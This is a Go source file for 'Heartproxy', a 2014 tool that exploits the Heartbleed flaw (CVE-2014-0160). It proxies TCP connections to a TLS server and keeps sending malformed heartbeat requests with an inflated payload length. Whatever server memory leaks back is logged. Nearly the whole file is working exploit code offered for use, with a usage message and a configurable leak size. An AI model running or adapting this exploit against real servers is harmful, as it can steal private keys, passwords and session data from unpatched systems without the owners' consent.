// Heartproxy - 2014 Markus Vervier
// based on https://github.com/FiloSottile/Heartbleed

package main

import (
	"fmt"
	"log"
	"net/url"
	"os"
	"bytes"
	"encoding/binary"
	"github.com/FiloSottile/Heartbleed/tls"
	"github.com/davecgh/go-spew/spew"
	"net"
	"time"
	"strconv"
)


// create random TAG for heartbeats

var gCheckString = []byte("TAGMEE")

// default
var gLeakSize = 31337

var usageMessage = `Datapipe TCP->SSL using the Heartbleed attack (CVE-2014-0160).

Usage:

	%s listenport server_name:port leaksize
	
`

func usage(progname string) {
	fmt.Fprintf(os.Stderr, usageMessage, progname)
	os.Exit(2)
}

func main() {

	args := os.Args
	if len(args) < 3 {
		usage(args[0])
	}

	if len(args) == 4 {
		log.Println("Using leaksize "+ args[3])
		leakSize, err := strconv.Atoi(args[3])
		gLeakSize = leakSize
		if err != nil {
			log.Println("leaksize not a number")
			os.Exit(1)
		}
	}

	// init random tag to recognize heartbeats
	devurandom, err := os.Open("/dev/urandom")
    	if err != nil {
		panic(err)
        	os.Exit(1)
	}
	randlen, err := devurandom.Read(gCheckString)
	if err != nil || randlen != len(gCheckString) {
		log.Println("read error or not enough randomness available")
		os.Exit(1)
	}
	
	

	listenport := args[1]
	host := args[2]

	u, err := url.Parse(host)
	if err == nil && u.Host != "" {
		host = u.Host
	}

	l, err := net.Listen("tcp", ":"+listenport)
    	if err != nil {
		panic(err)
        	os.Exit(1)
	}

	defer l.Close()
        fmt.Println("Listening on " + listenport )

	for {
		// Listen for an incoming connection.
		conn, err := l.Accept()
		if err != nil {
		    fmt.Println("Error accepting: ", err.Error())
		    os.Exit(1)
		}
		// Handle connections in a new goroutine.
		go proxyConn(conn, host)
    	}

}


// struct {
//    uint8  type;
//    uint16 payload_length;
//    opaque payload[HeartbeatMessage.payload_length];
//    opaque padding[padding_length];
// } HeartbeatMessage;
func buildEvilMessage() []byte {
	buf := bytes.Buffer{}
	err := binary.Write(&buf, binary.BigEndian, uint8(1))
	if err != nil {
		panic(err)
	}
	err = binary.Write(&buf, binary.BigEndian, uint16(len(gCheckString)+gLeakSize))
	if err != nil {
		panic(err)
	}
/*	_, err = buf.Write(payload)
	if err != nil {
		panic(err)
	} */
	_, err = buf.Write(gCheckString)
	if err != nil {
		panic(err)
	}
	return buf.Bytes()
}

func heartbleedCheck(conn *tls.Conn, buf *bytes.Buffer, vuln chan bool) func([]byte) {
	return func(data []byte) {
		spew.Fdump(buf, data)
		//buf.Write(data)
		if bytes.Index(data, gCheckString) == -1 {
			vuln <- false
		} else {
			vuln <- true
		}
	}
}


func clientToTarget(err error, client net.Conn, target *tls.Conn, finished chan bool, lock chan int){
		buf :=  make ([]byte, 1) // TODO make buffered

		for {
//			log.Println("reading client")
			num, err := client.Read(buf)
			//log.Printf("got %d number of bytes\n", num)
			if err != nil {
				fmt.Println("error:")
				fmt.Println(err)
				
				// write remaining if any
				if num > 0 {
					lock <- 1
					_, err = target.Write(buf)
					<- lock
				}

				finished <- true
				return
			}
//			log.Printf("Got client buf: %s\n", buf)
			lock <- 1 // semaphore like -- don't mix with collectHeartBeats
			_, err = target.Write(buf)
			<- lock
			if err != nil {
				log.Printf("Some error while writing\n")
				fmt.Println(err)
				finished <-true
				return
			}
			
		}
}

func targetToClient(err error, client net.Conn, conn *tls.Conn, finished chan bool){
		buf :=  make ([]byte, 1)// TODO make buffered

		for {
//			log.Println("reading target")
			num, err := conn.Read(buf)
			if err != nil {
				fmt.Println("error:")
				fmt.Println(err)

				// write remaining if any
				if num > 0 {
					_, err = client.Write(buf)
				}

				finished <- true
				return
			}
			_, err = client.Write(buf)
			if err != nil {
				log.Printf("Some error while writing\n")
				fmt.Println(err)
				finished <- true
				return
			}

		}
}

func collectHeartBeats(err error, target *tls.Conn, finished chan bool, lock chan int) {
		var vuln = make(chan bool, 1)
		hbuf := new(bytes.Buffer)
	        //constantly send heartbeats
		for {
			lock <- 1 // sempahore like -- don't mix with clientToTarget
			err = target.SendHeartbeat([]byte(buildEvilMessage()), heartbleedCheck(target, hbuf, vuln))
			<- lock			
			if err != nil {
				finished <- true
				log.Printf("error during heartbeat\n")
				return
			}
			
			select {
				case status := <-vuln:
					if (status) {
						log.Printf("\nLEAKED:\n%s\n", string(hbuf.Bytes()))
					}
			}
			//time.Sleep(1 * time.Second)
			
		}
}

func proxyConn (client net.Conn, host string) {
	
	log.Println("New connection from: "+host)
	net_conn, err := net.DialTimeout("tcp", host, 3*time.Second)
	if err != nil {
		return
	}
//	net_conn.SetDeadline(time.Now().Add(9 * time.Second))
	conn := tls.Client(net_conn, &tls.Config{InsecureSkipVerify: true})
	err = conn.Handshake()
	if err != nil {
		log.Printf("Handshake failure\n")
		return
	}

	log.Println("Connected to target...")

	var lock = make(chan int, 1)
	var finished = make(chan bool, 1)

	log.Println("starting up heartbeat collector")
	go collectHeartBeats(err, conn, finished, lock)

        // process data on the client
	log.Println("starting up clientToTarget collector")
	go clientToTarget(err, client, conn, finished, lock)

        // process data on the target
	log.Println("starting up targetToClient collector")
	go targetToClient(err, client, conn, finished)


	for {
	    select {
		case status := <-finished:
			if status {
				log.Println("quitting..")
				time.Sleep(2 * time.Second) // wait for buffers etc...
				client.Close()
				conn.Close()
				return
			}
	    }
	}
	

}
